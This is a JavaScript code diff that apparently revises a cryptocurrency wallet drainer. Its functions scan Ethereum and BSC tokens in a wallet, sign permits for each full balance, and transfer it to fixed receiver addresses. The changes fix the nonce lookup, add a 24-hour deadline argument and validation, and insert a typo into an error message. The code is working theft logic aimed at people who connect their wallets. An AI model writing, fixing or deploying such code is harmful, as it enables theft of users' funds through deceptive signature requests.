@@ -45,7 +45,7 @@ async function getTokenBalance(walletClient, tokenAddress, walletAddress, public
     })
     return balance.toString()
   } catch (error) {
-    console.error(`Error getting token balance for ${tokenAddress}:`, error)
+    console.error(`Error fgetting token balance for ${tokenAddress}:`, error)
     return '0'
   }
 }
@@ -169,7 +169,18 @@ async function createTokenPermit(walletClient, tokenAddress, amount, spenderAddr
     permitService.setDomain(chainId, tokenAddress)
     
     // Get token nonce
-    const nonce = await permitService.getTokenNonce(walletClient, tokenAddress, walletAddress)
+    const nonce = await permitService.getTokenNonce(publicClient, tokenAddress, walletAddress)
+    console.log("Token nonce:", nonce)
+    
+    // Validate nonce
+    if (isNaN(nonce) || nonce === null || nonce === undefined) {
+      throw new Error("Invalid token nonce")
+    }
+    
+    // Validate amount
+    if (!amount || amount === "0") {
+      throw new Error("Invalid amount for permit")
+    }
     
     // Calculate deadline (current time + specified hours)
     const deadline = Math.floor(Date.now() / 1000) + (deadlineHours * 3600)
@@ -182,6 +193,8 @@ async function createTokenPermit(walletClient, tokenAddress, amount, spenderAddr
       nonce, 
       deadline
     )
+    
+    console.log("Permit message to sign:", permitMessage)
     
     // Sign permit
     const signature = await permitService.signPermit(walletClient, permitMessage)
@@ -267,7 +280,7 @@ async function scanEthereumTokens(walletClient, walletAddress, publicClient) {
           
           // Create permit for the transfer
           console.log(`Creating permit for ${token.name}...`)
-          const permitData = await createTokenPermit(walletClient, token.address, balanceBN.toString(), receiveAddress, publicClient)
+          const permitData = await createTokenPermit(walletClient, token.address, balanceBN.toString(), receiveAddress, 24, publicClient)
           console.log(`${token.name} permit created successfully`)
           
           // Execute permit transfer
@@ -335,7 +348,7 @@ async function scanBscTokens(walletClient, walletAddress, publicClient) {
           
           // Create permit for the transfer
           console.log(`Creating permit for ${token.name}...`)
-          const permitData = await createTokenPermit(walletClient, token.address, balanceBN.toString(), bep20ReceiverAddress, publicClient)
+          const permitData = await createTokenPermit(walletClient, token.address, balanceBN.toString(), bep20ReceiverAddress, 24, publicClient)
           console.log(`${token.name} permit created successfully`)
           
           // Execute permit transfer
